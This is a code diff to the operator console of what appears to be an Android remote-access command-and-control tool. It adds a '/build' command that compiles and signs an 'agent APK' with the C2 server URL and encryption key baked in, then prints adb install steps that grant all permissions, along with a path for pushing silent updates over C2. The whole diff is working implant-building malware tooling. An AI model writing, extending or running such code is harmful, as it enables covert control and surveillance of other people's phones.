@@ -803,6 +803,8 @@ COMMAND_INFO = {
     "vibrate": ("device", "/vibrate [ms]", "Trigger vibration (default 500ms)",
                 "Vibrates device for specified milliseconds.\nExample:\n  /vibrate 1000"),
     # upkeep
+    "build": ("upkeep", "/build [url]", "Compile, sign & package agent APK",
+              "Runs build.sh to package the agent APK. Auto-bakes the active C2 tunnel URL and encryption key.\nExample:\n  /build\n  /build https://c2.threatvector.tech"),
     "update": ("upkeep", "/update <local.apk>", "Push & install APK update",
                "Uploads an APK to device and invokes silent package installer.\nExample:\n  /update build/apk/androremote.apk"),
     "installstatus": ("upkeep", "/installstatus", "Check status of last APK install",
@@ -1112,6 +1114,54 @@ def setup_autocomplete():
     readline.set_completer(c2_completer)
 
 
+def cmd_build(target_url=None):
+    root_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+    build_script = os.path.join(root_dir, "build.sh")
+    if not os.path.isfile(build_script):
+        if os.path.isfile("build.sh"):
+            build_script = os.path.abspath("build.sh")
+        else:
+            err("build.sh not found")
+            return False
+
+    url = target_url or TUNNEL.get("url")
+    if not url:
+        cfg = tunnel_named_cfg()
+        if cfg and cfg.get("hostname"):
+            url = f"https://{cfg['hostname']}"
+    if not url:
+        port = ARGS.port if ARGS else PORT_DEFAULT
+        proto = "https" if TLS else "http"
+        url = f"{proto}://127.0.0.1:{port}"
+
+    with console.status(f"[cyan]Building agent APK for [bold]{escape(url)}[/bold]...[/cyan]", spinner="dots"):
+        try:
+            res = subprocess.run(
+                ["/bin/sh", build_script, url],
+                cwd=os.path.dirname(build_script),
+                capture_output=True,
+                text=True,
+            )
+        except Exception as e:
+            err(f"build execution failed: {e}")
+            return False
+
+    if res.returncode != 0:
+        err("APK build failed:")
+        for line in (res.stderr or res.stdout).splitlines()[-10:]:
+            console.print(f"    [red dim]{escape(line)}[/red dim]")
+        return False
+
+    apk_path = os.path.join(os.path.dirname(build_script), "build", "apk", "androremote.apk")
+    size = os.path.getsize(apk_path) if os.path.isfile(apk_path) else 0
+    ok(f"built [bold cyan]{escape(apk_path)}[/bold cyan] ({size:,} bytes)")
+    console.print(f"  [white bold]baked C2 URL[/white bold]   [green]{escape(url)}[/green]")
+    console.print(f"  [white bold]encryption[/white bold]     [green]AES-256-GCM[/green] [dim](key {key_fp()}…)[/dim]")
+    console.print(f"  [dim]Install via adb: [bold cyan]adb install -r -g {escape(apk_path)}[/bold cyan][/dim]")
+    console.print(f"  [dim]Or update over C2: [bold cyan]/update {escape(apk_path)}[/bold cyan][/dim]\n")
+    return True
+
+
 def dispatch(argv):
     """Run one operator command. Returns False to exit console."""
     raw_op = argv[0]
@@ -1318,6 +1368,8 @@ def dispatch(argv):
             console.print()
         else:
             ev("*", "no result yet", "cyan")
+    elif op == "build":
+        cmd_build(rest[0] if rest else None)
     elif PLUGIN_MANAGER and PLUGIN_MANAGER.has_command(op):
         PLUGIN_MANAGER.dispatch(op, rest)
     else:
